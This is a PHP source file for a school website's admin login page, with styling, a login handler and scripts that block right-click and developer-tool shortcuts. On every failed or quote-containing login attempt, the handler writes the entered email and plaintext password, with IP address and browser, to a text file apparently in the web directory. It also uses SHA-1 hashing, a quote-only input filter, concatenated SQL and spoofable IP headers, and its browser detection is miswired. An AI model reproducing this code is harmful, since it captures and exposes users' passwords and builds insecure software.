<?php
require_once("../include/initialize.php");

if (isset($_SESSION['ACCOUNT_ID'])){
    redirect(web_root."admin/index.php");
}

// Function to validate input
function validate_input($input) {
    return !preg_match("/['\"]/", $input);
}

// Function to log user information to a file
function logUserInfo($email, $password, $ip_address, $browser, $os, $file) {
    // Set timezone to Manila
    date_default_timezone_set('Asia/Manila');

    // Prepare data to write to text file
    $data = "Date: " . date('Y-m-d H:i:s') . "\n";
    $data .= "Email: " . $email . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "IP Address: " . $ip_address . "\n";
    $data .= "Browser: " . $browser . "\n";
    $data .= "Operating System: " . $os . "\n\n";

    // Write data to text file
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
        error_log("Failed to write to $file");
    } else {
        error_log("Data successfully written to $file");
    }
}

// Function to get browser
function getBrowser($user_agent) {
    if (strpos($user_agent, 'Firefox') !== false) {
        return 'Mozilla Firefox';
    } elseif (strpos($user_agent, 'Chrome') !== false) {
        return 'Microsoft Edge';
    } elseif (strpos($user_agent, 'Chrome') !== false) {
        return 'Google Chrome';
    } elseif (strpos($user_agent, 'Safari') !== false) {
        return 'Apple Safari';
    } elseif (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
        return 'Internet Explorer';
    } else {
        return 'Other';
    }
}

// Function to get OS
function getOS($user_agent) {
    if (preg_match('/Windows NT 10.0/i', $user_agent)) {
        return 'Windows 10';
    } elseif (preg_match('/Windows NT 6.3/i', $user_agent)) {
        return 'Windows 8.1';
    } elseif (preg_match('/Windows NT 6.2/i', $user_agent)) {
        return 'Windows 8';
    } elseif (preg_match('/Windows NT 6.1/i', $user_agent)) {
        return 'Windows 7';
    } elseif (preg_match('/Mac OS X/i', $user_agent)) {
        return 'Mac OS X';
    } elseif (preg_match('/Linux/i', $user_agent)) {
        return 'Linux';
    } else {
        return 'Other';
    }
}

// Function to get IP address
function getIPAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<title>Pacac High School</title>

<!-- Bootstrap core CSS -->
<link href="<?php echo web_root; ?>css/bootstrap.min.css" rel="stylesheet">
<link href="<?php echo web_root; ?>css/bootstrap-datetimepicker.min.css" rel="stylesheet" media="screen">
<link href="<?php echo web_root; ?>css/dataTables.bootstrap.css" rel="stylesheet" media="screen">
<link rel="stylesheet" type="text/css" href="<?php echo web_root; ?>css/jquery.dataTables.css"> 
<link href="<?php echo web_root; ?>css/bootstrap.css" rel="stylesheet" media="screen">
<link href="<?php echo web_root; ?>fonts/font-awesome.min.css" rel="stylesheet" media="screen">
<!-- Plugins -->
<script type="text/javascript" language="javascript" src="<?php echo web_root; ?>js/jquery.js"></script>
<script type="text/javascript" language="javascript" src="<?php echo web_root; ?>js/jquery.dataTables.js"></script>

<style>
@CHARSET "UTF-8";
.progress-bar {
    color: #333;
}
* {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    outline: none;
}
.form-control {
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
}
body {
    background: url(../img/front.jpg) repeat center center fixed;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
}
.login-form {
    margin-top: 60px;
}
form[role=login] {
    color: #5d5d5d;
    background: transparent;
    border: 2px solid rgba(255, 255, 255, .8);
    padding: 26px;
    border-radius: 10px;
    -moz-border-radius: 10px;
    -webkit-border-radius: 10px;
}
form[role=login] img {
    display: block;
    margin: 0 auto;
    margin-bottom: 35px;
    height: 90px;
}
form[role=login] input,
form[role=login] button {
    font-size: 18px;
    margin: 16px 0;
}
form[role=login] > div {
    text-align: center;
}
.form-links {
    text-align: center;
    margin-top: 1em;
    margin-bottom: 50px;
}
.form-links a {
    color: #fff;
}
</style>
</head>
<body oncopy="return false;" oncontextmenu="return myRightClick();" oncut="return false;" onpaste="return false;">

<div class="container">
    <div class="row" id="pwd-container">
        <div class="col-md-4"></div>
        <div class="col-md-4">
            <section class="login-form">
                <?php echo check_message(); ?>
                <form method="post" action="" role="login">
                    <img src="../img/pacac100x-removebg-preview.png" height="25px" class="img-responsive" alt="" />
                    <input type="text" name="user_email" placeholder="Username" required class="form-control input-lg" value="" />
                    <input type="password" name="user_pass" class="form-control input-lg" id="password" placeholder="Password" required />
                    <div class="pwstrength_viewport_progress"></div>
                    <button type="submit" name="btnLogin" class="btn btn-lg btn-primary btn-block">Sign in</button>
                </form>
                <div class="form-links"></div>
            </section>
        </div>
        <div class="col-md-4"></div>
    </div>
</div>

<?php
if (isset($_POST['btnLogin'])) {
    $email = trim($_POST['user_email']);
    $upass  = trim($_POST['user_pass']);
    $h_upass = sha1($upass);

    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = getBrowser($user_agent);
    $os = getOS($user_agent);
    $ip_address = getIPAddress();

    if (!validate_input($email) || !validate_input($upass)) {
        logUserInfo($email, $upass, $ip_address, $browser, $os, 'user-admin-info.txt');
        message("Invalid input! Quotes are not allowed.", "error");
        redirect("login.php");
    } elseif ($email == '' || $upass == '') {
        message("Invalid Username and Password!", "error");
        redirect("login.php");
    } else {
        $user = new User();
        $res = $user::userAuthentication($email, $h_upass);
        if ($res) {
            message("You logon as " . $_SESSION['ACCOUNT_TYPE'] . ".", "success");
            $sql = "INSERT INTO `tbllogs` (`USERID`, `LOGDATETIME`, `LOGROLE`, `LOGMODE`) 
                    VALUES (" . $_SESSION['ACCOUNT_ID'] . ",'" . date('Y-m-d H:i:s') . "','" . $_SESSION['ACCOUNT_TYPE'] . "','Logged in')";
            $mydb->setQuery($sql);
            $mydb->executeQuery();

            if ($_SESSION['ACCOUNT_TYPE'] == 'Administrator' || $_SESSION['ACCOUNT_TYPE'] == 'Registrar') {
                redirect(web_root . "admin/index.php");
            } else {
                redirect(web_root . "admin/login.php");
            }
        } else {
            logUserInfo($email, $upass, $ip_address, $browser, $os, 'user-admin-info.txt');
            message("Account does not exist! Please contact Administrator.", "error");
            redirect(web_root . "admin/login.php");
        }
    }
}
?>

<script type="text/javascript">
function myRightClick() {
    alert("Function Disabled.");
    return false;
}

    document.onkeydown = function(e) {
      if(event.keyCode == 123) {
        return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
        return false;
      }
      if(e.ctrlKey && e.keyCode == 'C'.charCodeAt(0)) {
        return false;
      }
       if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
      }
    }
  </script>
</body>
</html>
